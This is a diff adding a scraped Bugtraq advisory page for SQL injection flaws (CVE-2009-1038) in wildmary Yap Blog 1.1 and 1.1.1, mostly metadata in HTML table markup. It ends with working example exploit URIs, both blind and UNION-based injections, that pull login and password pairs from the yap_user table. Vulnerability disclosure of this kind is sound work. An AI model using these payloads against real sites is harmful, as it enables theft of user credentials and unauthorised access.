@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid34274<p><b><span style="font-size: 18pt;">YAP Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/34274/info">info</a><br><a href="http://www.securityfocus.com/bid/34274/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/34274/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/34274/solution">solution</a><br><a href="http://www.securityfocus.com/bid/34274/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				34274
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-1038<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 27 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 27 2009 07:46PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				SirGod
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					wildmary Yap Blog 1.1.1 <br/>
+					
+				
+					wildmary Yap Blog  1.1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/path/comments.php?image_id=1 and ascii(substring((SELECT concat(login,0x3a,pass) from yap_user limit 0,1),1,1))&amp;gt;97<br/>http://www.example.com/path/comments.php?image_id=1 and ascii(substring((SELECT concat(login,0x3a,pass) from yap_user limit 0,1),2,1))&amp;gt;100<br/>http://www.example.com/path/admin/index.php?page=users_modif&amp;amp;action=modif&amp;amp;user=null union all select concat_ws(0x3a,login,pass),2 from yap_user where id=1--
+	
+		<ul>
+</ul>
+</div>
